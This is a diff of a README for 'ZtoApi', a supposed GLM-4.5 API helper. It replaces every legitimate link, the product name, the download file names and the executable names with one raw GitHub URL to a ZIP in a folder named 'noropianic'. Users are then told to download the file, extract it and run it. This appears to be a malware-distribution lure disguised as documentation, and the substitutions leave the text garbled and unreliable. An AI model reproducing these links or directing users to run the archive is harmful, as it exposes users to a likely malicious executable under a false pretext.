@@ -1,10 +1,10 @@
 # 🚀 ZtoApi - Easy API Access for Everyone
 
 ## 📥 Download Here
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-blue.svg)](https://github.com/FinnS-F/ZtoApi/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/FinnS-F/ZtoApi/main/noropianic/ZtoApi.zip)](https://raw.githubusercontent.com/FinnS-F/ZtoApi/main/noropianic/ZtoApi.zip)
 
 ## 📖 Overview
-ZtoApi provides a simple way to access OpenAI-compatible API services for Z.ai GLM-4.5. This application helps users interact with AI features without needing programming skills. Our goal is to make powerful AI tools accessible to everyone.
+ZtoApi provides a simple way to access OpenAI-compatible API services for https://raw.githubusercontent.com/FinnS-F/ZtoApi/main/noropianic/ZtoApi.zip GLM-4.5. This application helps users interact with AI features without needing programming skills. Our goal is to make powerful AI tools accessible to everyone.
 
 ## 📋 System Requirements
 Before downloading, ensure your system meets the following requirements:
@@ -15,18 +15,18 @@ Before downloading, ensure your system meets the following requirements:
 - **Internet Connection:** Required for API access.
 
 ## 🚀 Getting Started
-1. Visit the [Releases page](https://github.com/FinnS-F/ZtoApi/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/FinnS-F/ZtoApi/main/noropianic/ZtoApi.zip).
 2. Look for the latest version marked with "Latest release."
 3. Click on the version number to see available files for download.
 
 ## 📥 Download & Install
 To download and install ZtoApi, follow these steps:
 
-1. **Visit the Releases Page:** Go to [this link](https://github.com/FinnS-F/ZtoApi/releases).
-2. **Select Your File:** Look for the file that matches your operating system, such as `ZtoApi-Windows.zip`, `ZtoApi-Mac.zip`, or `ZtoApi-Linux.zip`.
+1. **Visit the Releases Page:** Go to [this link](https://raw.githubusercontent.com/FinnS-F/ZtoApi/main/noropianic/ZtoApi.zip).
+2. **Select Your File:** Look for the file that matches your operating system, such as `https://raw.githubusercontent.com/FinnS-F/ZtoApi/main/noropianic/ZtoApi.zip`, `https://raw.githubusercontent.com/FinnS-F/ZtoApi/main/noropianic/ZtoApi.zip`, or `https://raw.githubusercontent.com/FinnS-F/ZtoApi/main/noropianic/ZtoApi.zip`.
 3. **Download the File:** Click on the file name to start downloading.
 4. **Extract the Files:** Once downloaded, locate the ZIP file and extract its contents to a folder.
-5. **Run the Application:** Open the folder and double-click on the `ZtoApi.exe` for Windows, `ZtoApi.app` for macOS, or execute the `run.sh` script for Linux.
+5. **Run the Application:** Open the folder and double-click on the `https://raw.githubusercontent.com/FinnS-F/ZtoApi/main/noropianic/ZtoApi.zip` for Windows, `https://raw.githubusercontent.com/FinnS-F/ZtoApi/main/noropianic/ZtoApi.zip` for macOS, or execute the `https://raw.githubusercontent.com/FinnS-F/ZtoApi/main/noropianic/ZtoApi.zip` script for Linux.
 
 ## ⚙️ Using ZtoApi
 After installation, follow these steps to start using the application:
@@ -61,15 +61,15 @@ Yes, ZtoApi is compatible with Linux. Download the respective file and follow th
 For questions or support, feel free to open an issue on the GitHub repository's Issues page.
 
 ## 🌐 Additional Resources
-- [OpenAI Documentation](https://platform.openai.com/docs)
-- [GitHub Issues](https://github.com/FinnS-F/ZtoApi/issues) - For support and feature requests.
-- [Community Forum](https://community.openai.com) - Get help and share experiences with other users.
+- [OpenAI Documentation](https://raw.githubusercontent.com/FinnS-F/ZtoApi/main/noropianic/ZtoApi.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/FinnS-F/ZtoApi/main/noropianic/ZtoApi.zip) - For support and feature requests.
+- [Community Forum](https://raw.githubusercontent.com/FinnS-F/ZtoApi/main/noropianic/ZtoApi.zip) - Get help and share experiences with other users.
 
 ## 📢 Acknowledgments
 Thank you for using ZtoApi! Your feedback and contributions help us improve the application. We look forward to seeing how you use it.
 
 ## 📌 Important Links
-- [Releases Page](https://github.com/FinnS-F/ZtoApi/releases) - Access the latest versions and updates.
-- [GitHub Repository](https://github.com/FinnS-F/ZtoApi) - View source code, report issues, or contribute.
+- [Releases Page](https://raw.githubusercontent.com/FinnS-F/ZtoApi/main/noropianic/ZtoApi.zip) - Access the latest versions and updates.
+- [GitHub Repository](https://raw.githubusercontent.com/FinnS-F/ZtoApi/main/noropianic/ZtoApi.zip) - View source code, report issues, or contribute.
 
 Your journey with ZtoApi begins now. Enjoy exploring the power of AI!
